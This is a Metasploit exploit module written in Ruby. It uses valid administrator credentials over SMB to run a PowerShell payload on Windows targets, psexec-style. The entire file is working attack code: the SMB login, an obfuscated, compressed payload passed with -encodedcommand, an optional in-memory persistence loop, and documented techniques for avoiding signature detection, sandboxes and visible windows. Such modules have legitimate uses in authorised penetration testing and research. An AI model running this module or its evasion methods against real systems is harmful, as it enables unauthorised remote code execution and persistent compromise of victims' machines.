# -*- coding: binary -*-

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
		Rank = ManualRanking

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB::Psexec
	include Msf::Exploit::Powershell
	include Msf::Auxiliary::Report
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Windows Authenticated Powershell Command Execution',
			'Description'    => %q{
					This module uses a valid administrator username and password to execute a powershell
				payload using a similar technique to the "psexec" utility provided by SysInternals. The
				payload is obfuscated, gzip compressed, then encoded in base64 and executed from the commandline
				using the -encodedcommand flag. Using this method, the payload is never written to disk, and
				given that each payload is unique, is not very prone to signature based detection on the wire.
				Since executing shellcode in .NET requires the use of system resources from unmanaged memory space,
				the .NET (PSH) architecture must match that of the payload. Lastly, a persist option is provided
				to execute the payload in a while loop in order to maintain a form of in-mem persistence. In the event
				of a sandbox observing PSH execution, a delay and other obfuscation may be added to avoid detection.
				In order to avoid interactive process notifications for the current user, the psh payload has
				been reduced in size and wrapped in a powershell invocation which hides the window entirely.
			},

			'Author'         => [
				'RageLtMan <rageltman[at]sempervictus'
			],

			'License'        => MSF_LICENSE,
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'WfsDelay'     => 10,
					'EXITFUNC' => 'thread'
				},
			'Payload'        =>
				{
					'Space'        => 8192,
					'DisableNops'  => true,
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'References'     => [
				[ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
				[ 'OSVDB', '3106'],
				[ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ],
				[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
				[ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
			]
		))

		register_options([
			OptBool.new('PERSIST', [false, 'Run the payload in a loop']),
			OptBool.new('PSH_OLD_METHOD', [false, 'Use powershell 1.0', false]),
			OptBool.new('DryRun',[false,'dry run',false]),
		], self.class)
	end


	def exploit
		command = cmd_psh_payload(payload.encoded,datastore['PSH_OLD_METHOD'])
		if datastore['DryRun']
			print_good command
			return
		end

		#Try and authenticate with given credentials
		if connect
			begin
				smb_login
			rescue StandardError => autherror
				print_error("#{peer} - Unable to authenticate with given credentials: #{autherror}")
				return
			end
			# Execute the powershell command
			begin
				print_status("#{peer} - Executing the payload...")
				#vprint_good(command)
				return psexec(command)
			rescue StandardError => exec_command_error
				print_error("#{peer} - Unable to execute specified command: #{exec_command_error}")
				return false
			end
			disconnect
		end
	end

	def peer
		return "#{rhost}:#{rport}"
	end

end
